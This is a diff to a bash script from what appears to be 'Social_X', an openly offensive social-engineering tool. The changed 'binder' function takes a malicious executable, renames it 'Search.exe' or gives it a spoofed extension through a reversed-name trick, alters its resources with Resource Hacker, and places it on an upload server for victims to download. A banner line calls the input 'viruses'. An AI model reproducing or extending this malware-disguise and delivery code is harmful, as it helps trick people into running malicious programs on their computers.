@@ -31,6 +31,8 @@ function banner(){
     echo -e "                         By:Aziz Kaplan" 
     echo -e "                          Version:2.0" 
     echo ${green} ------------------------------------------------------------------
+    
+    echo ${green} Note: This tool might not work probably on fully-detectable viruses.
 }
 
 
@@ -63,6 +65,7 @@ function binder() {
             exe_file=$(basename $exe_path)
             echo ${lightblue}
             sudo cp $exe_path wsgi_sw/Upload_Server/images/
+            sudo mv wsgi_sw/Upload_Server/images/$exe_file wsgi_sw/Upload_Server/images/Search.exe
 
     elif [[ $ask == "n" || $ask == "no" || $ask == "NO"  || $ask == "N" ]] ;then
         clear
@@ -174,18 +177,12 @@ function binder() {
     wine $HOME'/.wine/drive_c/Program Files (x86)/Dev-Cpp/devcpp.exe'
     clear
     banner
-    echo -e "${green}[+]${lightblue}Enter a file description to the malicious file:\n "
-    read -p  "${lightblue}Social_X${purple}@${green}$(whoami)${RED}[${reset}~${RED}]${purple}" desc
-    clear 
-    banner
-    echo -e "${green}[+]${lightblue}Enter the path of icon file:\n"
-    read -p  "${lightblue}Social_X${purple}@${green}$(whoami)${RED}[${reset}~${RED}]${purple}" icon
     clear
     banner
     mv CppCodes/*.exe CppCodes/lif$ext_spoof.exe
     cd CppCodes/
-    sudo wine64 ../RCedit/rcedit-x64.exe lif$ext_spoof.exe --set-version-string FileDescription $desc --set-icon $icon &> /dev/null
-    sudo cp lif$ext_spoof.exe ../wsgi_sw/Upload_Server/images/
+    wine /root/.wine/drive_c/Program\ Files\ \(x86\)/Resource\ Hacker/ResourceHacker.exe
+    sudo cp /root/.wine/drive_c/users/root/Desktop/Social_X/*.exe ../wsgi_sw/Upload_Server/images/ &>/dev/null
     look_zip=$(ls -l | awk {'print $9'} | cut -d "." -f 2)
     left2right
     cd ../
